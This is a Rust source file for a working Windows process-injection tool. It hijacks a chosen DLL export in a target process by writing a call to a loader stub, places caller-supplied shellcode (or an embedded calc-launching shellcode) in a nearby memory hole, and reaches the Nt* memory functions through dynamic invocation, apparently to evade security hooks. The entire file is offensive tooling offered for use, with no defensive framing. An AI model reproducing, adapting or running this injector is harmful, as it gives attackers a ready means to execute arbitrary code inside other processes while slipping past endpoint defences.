use windows::Win32::Foundation::HANDLE;
use windows::Win32::System::{LibraryLoader, Threading};
use windows::core::{PCSTR};
use std::ffi::c_void;
use std::path::Path;
use dinvoke;

use std::io;
use std::io::Read;
use std::io::BufReader;
use std::fs::File;

use clap::Parser;

use std::time::Instant;


#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Target process ID to inject
    #[arg(short, long)]
    pid: u32,

    /// Path for x64 shellcode paylod (default calc payload will be used if not specified)
    #[arg(short, long)]
    shellcode_file: Option<String>,

    /// DLL that contains the export to patch
    #[arg(short, long)]
    dll: String,
       
    /// Exported function that will be hijacked
    #[arg(short, long)]
    export: String,
}


fn main() {

    let calc: Vec<u8> = vec![0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
    0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
    0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
    0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
    0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
    0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
    0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
    0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
    0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3];

    let args = Args::parse();

    let mut shellcode: Vec<u8>;
    let shellcode_file = args.shellcode_file.unwrap_or(String::from(""));
    if shellcode_file != ""{
        shellcode = read_file(&shellcode_file).unwrap_or_else(|_|{
            eprintln!("Could not read file: {}", shellcode_file);
            std::process::exit(1);
        });
    }else {
        println!("[*] No shellcode provided using default calc shellcode");
        shellcode = calc;
    }

    let mut payload: Vec<u8> = vec![0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
    0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
    0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
    0xE0, 0x90];

    
    unsafe{
    
    let ntdll = dinvoke::get_module_base_address("ntdll.dll");


    let export_address = get_export_address(&args.dll, &args.export).unwrap_or_else(|e|{
        eprintln!("{}", e);
        std::process::exit(1);
    });

    println!("[*] Found {}!{} at @{:x}", &args.dll, &args.export, export_address);

    let target_process_handle = Threading::OpenProcess(Threading::PROCESS_ALL_ACCESS, false, args.pid).unwrap_or_else(|_|{
        eprintln!("Could not get handle to pid {}", &args.pid);
        std::process::exit(1);
    });

    println!("[*] Opened process with pid {}", &args.pid);
    
    let loader_address = find_memory_hole(target_process_handle, export_address, shellcode.len() + payload.len(), ntdll).unwrap_or_else(|e|{
        eprintln!("{}", e);
        std::process::exit(1);
    });
    
    println!("[*] Allocated loader and shellcode at @{:x} in pid {}", loader_address, &args.pid);

    let original_bytes = read_virtual_memory(ntdll, export_address, target_process_handle);

    payload.splice(18..18+original_bytes.to_le_bytes().len(), original_bytes.to_le_bytes().iter().cloned());
    payload.append(&mut shellcode);

    // Get relative loader addres
    let export_address: i64 = std::mem::transmute(export_address);
    let loader_address: i64 = std::mem::transmute(loader_address);
    let relative_loader_address = (loader_address- (export_address + 5)) as i32;

    // Patch Export Function
    patch_export_function(relative_loader_address, export_address as usize, ntdll, target_process_handle).unwrap_or_else(|e|{
        eprintln!("{}", e);
        std::process::exit(1);
    });
  
    println!("[*] Patched {}!{}", &args.dll, &args.export);

    // write payload at memory hole
    write_payload(loader_address, payload.clone(), ntdll, target_process_handle).unwrap_or_else(|e|{
        eprintln!("{}", e);
        std::process::exit(1);
    });

    println!("[*] Shellcode injected, waiting 60 seconds for hook to be called");

    cleanup(export_address as usize, original_bytes, ntdll, target_process_handle, loader_address).unwrap_or_else(|e|{
        eprintln!("{}", e);
        std::process::exit(1);
    });

   }
}

unsafe fn find_memory_hole(h_process: HANDLE, export_address: usize, mut size: usize, ntdll: isize) -> Result<usize, &'static str>{
    
    let mut ret: Option<i32>;   
    let mut func_ptr: unsafe extern "system" fn (HANDLE, *mut *mut c_void, usize, *mut usize, u32, u32) -> i32;

    let mut loader_address: usize = 0;
    let mut remote_loader_address = (export_address & 0xFFFFFFFFFFF70000) - 0x70000000;
    
    
    while remote_loader_address < export_address + 0x70000000{
    
    let mut remote_loader_address_ptr: *mut c_void = std::mem::transmute(remote_loader_address);
    
    dinvoke::dynamic_invoke!(ntdll, "NtAllocateVirtualMemory", func_ptr, ret, h_process, &mut remote_loader_address_ptr, 0, &mut size, 0x1000 | 0x2000, 0x20);
    if ret.unwrap() != 0{
        remote_loader_address = remote_loader_address  + 0x10000; 
    }else{
        loader_address = remote_loader_address as usize;
        break;
    }
    }

    match loader_address{
        0 => Err("Could not find memory hole"),
        _ => Ok(loader_address)
    }

}

unsafe fn get_export_address(dll: &str, function: &str) -> Result<usize,String>{

    let hmodule = match LibraryLoader::GetModuleHandleA(PCSTR(format!("{}\0", dll).as_mut_ptr())){
        Ok(n) => n,
        Err(_) => return Err(format!("Failed to open handle to DLL {}", dll))
    };
    
    let export_address: usize = std::mem::transmute(LibraryLoader::GetProcAddress(hmodule, PCSTR(format!("{}\0", function).as_mut_ptr())));

    if export_address == 0 {
        return Err(format!("Failed to find export {} in dll {}", function, dll));
    }else {
        return Ok(export_address);
    }
            
}

unsafe fn patch_export_function(relative_loader_address: i32, export_address: usize, ntdll: isize, target_process_handle: HANDLE) -> Result<(), &'static str>{

    // update call opcode with relative loader address
    let mut call_opcode: Vec<u8> = vec![0xe8, 0, 0, 0, 0];
    call_opcode.splice(1..1+relative_loader_address.to_le_bytes().len(), relative_loader_address.to_le_bytes().iter().cloned());


    let mut ret: Option<i32>;
    let mut export_address_new: *mut c_void = std::mem::transmute(export_address);

    // Change export address to RWX
    let mut size = 8;
    let mut old_protect = 0 as u32;
    let func_ptr: unsafe extern "system" fn (HANDLE, *mut *mut c_void, *mut usize, u32, *mut u32) -> i32;
    dinvoke::dynamic_invoke!(ntdll, "NtProtectVirtualMemory", func_ptr, ret, target_process_handle, &mut export_address_new, &mut size, 0x40, &mut old_protect );
    if !(ret.unwrap() >= 0){
        return Err("Error changing export function address to RWX");
    }

    let export_address: *mut c_void = std::mem::transmute(export_address);
    let mut bytes_written: usize = 0;

    let func_ptr: unsafe extern "system" fn (HANDLE, *mut c_void, *mut c_void, usize, *mut usize) -> i32;
    dinvoke::dynamic_invoke!(ntdll, "NtWriteVirtualMemory", func_ptr, ret, target_process_handle, export_address, call_opcode.as_mut_ptr() as *mut c_void, call_opcode.len(), &mut bytes_written);
    if !(ret.unwrap() >= 0){
        return Err("Error writing patch to export function address");
    }

    Ok(())
}


unsafe fn write_payload(loader_address: i64, mut payload: Vec<u8>, ntdll: isize, target_process_handle: HANDLE) -> Result<(), &'static str>{
    
    let mut ret: Option<i32>;
    let mut bytes_written: usize = 0;
    
    let mut old_protect = 0 as u32;
    let mut loader_address: *mut c_void = std::mem::transmute(loader_address);
    let func_ptr: unsafe extern "system" fn (HANDLE, *mut *mut c_void, *mut usize, u32, *mut u32) -> i32;
    dinvoke::dynamic_invoke!(ntdll, "NtProtectVirtualMemory", func_ptr, ret, target_process_handle, &mut loader_address, &mut payload.len(), 0x04, &mut old_protect );
    if !(ret.unwrap() >= 0){
        return Err("Error protected memory for payload");
    }

    let func_ptr: unsafe extern "system" fn (HANDLE, *mut c_void, *mut c_void, usize, *mut usize) -> i32;
    dinvoke::dynamic_invoke!(ntdll, "NtWriteVirtualMemory", func_ptr, ret, target_process_handle, loader_address, payload.as_mut_ptr() as *mut c_void, payload.len(), &mut bytes_written);
    if !(ret.unwrap() >= 0){
        return Err("Error writing writing payload to memory");
    }

    let func_ptr: unsafe extern "system" fn (HANDLE, *mut *mut c_void, *mut usize, u32, *mut u32) -> i32;
    dinvoke::dynamic_invoke!(ntdll, "NtProtectVirtualMemory", func_ptr, ret, target_process_handle, &mut loader_address, &mut payload.len(), old_protect, &mut old_protect);
    if !(ret.unwrap() >= 0){
        return Err("Error changing memory to old prorection");
    }

    Ok(())
}

unsafe fn cleanup(export_address: usize, original_byes: u64, ntdll: isize, target_process_handle: HANDLE, loader_address: i64) -> Result<(), &'static str>{

    let mut ret: Option<i32>;
    let mut bytes_to_read: usize = 8;
    let mut bytes_read: usize = 0;
    let mut buf: [u8; 8] = [0;8];

    let mut export_address: *mut c_void =std::mem::transmute(export_address);

    let mut func_ptr: unsafe extern "system" fn (HANDLE, *mut c_void, *mut c_void, usize, *mut usize) -> i32;

    let mut executed = false;
    let start = Instant::now();
    while start.elapsed().as_secs() < 60 && executed != true {
        dinvoke::dynamic_invoke!(ntdll, "NtReadVirtualMemory", func_ptr, ret, target_process_handle, export_address, buf.as_mut_ptr() as *mut c_void, bytes_to_read, &mut bytes_read);
        if !(ret.unwrap() >= 0){
            return Err("Error cleaning up export address");
        }
        let num = u64::from_le_bytes(buf);
        if num == original_byes{
            executed = true;
        }
        std::thread::sleep(std::time::Duration::from_secs(1));
    }

    if executed == true{
        
        let mut old_proect: u32 = 0;
        let func_ptr: unsafe extern "system" fn (HANDLE, *mut *mut c_void, *mut usize, u32, *mut u32) -> i32;
        dinvoke::dynamic_invoke!(ntdll, "NtProtectVirtualMemory", func_ptr, ret, target_process_handle, &mut export_address, &mut bytes_to_read, 0x20, &mut old_proect );
        if !(ret.unwrap() >= 0){
            return Err("Error cleaning up loader address");
        }

        let mut loader_address: *mut c_void = std::mem::transmute(loader_address);
        let mut region_size: usize = 0;
        let func_ptr: unsafe extern "system" fn (HANDLE, *mut *mut c_void, *mut usize, u32) -> i32;
        dinvoke::dynamic_invoke!(ntdll, "NtFreeVirtualMemory", func_ptr, ret, target_process_handle, &mut loader_address, &mut region_size, 0x00008000);
        if !(ret.unwrap() >= 0){
            return Err("Error freeing up shellcode memoory");
        }
        println!("[*] Shellcode executed, export restored")
    }else {
        println!("[*] Shellcode did not execute within 60s, it may still execute but we are not cleaning up")
    }
    windows::Win32::Foundation::CloseHandle(target_process_handle);

    Ok(())

}

unsafe fn read_virtual_memory(ntdll: isize, export_address: usize, target_process_handle: HANDLE) -> u64{

    let ret: Option<i32>;
    let bytes_to_read: usize = 8;
    let mut bytes_read: usize = 0;
    let mut buf: [u8; 8] = [0;8];

    let export_address: *mut c_void =std::mem::transmute(export_address);

    let func_ptr: unsafe extern "system" fn (HANDLE, *mut c_void, *mut c_void, usize, *mut usize) -> i32;
    dinvoke::dynamic_invoke!(ntdll, "NtReadVirtualMemory", func_ptr, ret, target_process_handle, export_address, buf.as_mut_ptr() as *mut c_void, bytes_to_read, &mut bytes_read);
    if !(ret.unwrap() >= 0){
        println!("Error reading memory");
    }

    let num = u64::from_le_bytes(buf);
    num
}

fn read_file(shellcode_file: &String) -> io::Result<Vec<u8>>{
    let f = File::open(Path::new(shellcode_file)).or_else(|e| Err(e))?;

    let mut reader = BufReader::new(f);
    let mut buffer = Vec::new();
    
    // Read file into vector
    reader.read_to_end(&mut buffer)?;

    Ok(buffer)

}